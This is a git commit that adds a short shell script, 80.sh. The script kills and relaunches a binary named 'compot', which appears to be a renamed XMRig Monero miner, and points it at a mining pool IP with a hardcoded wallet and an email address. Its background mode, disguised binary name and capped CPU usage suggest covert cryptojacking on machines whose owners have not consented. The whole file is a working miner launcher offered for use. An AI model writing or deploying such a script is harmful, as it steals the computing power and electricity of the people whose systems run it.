768de869d2f15ea55ec942bb5668f84c1096719e
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-04-15 17:28:28 -0400

    Add files via upload

---
+++ 80.sh
@@ -0,0 +1,3 @@
+pkill compot
+sleep 7
+compot -o 95.217.13.15:5489 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=43 --av=1 --variant -1
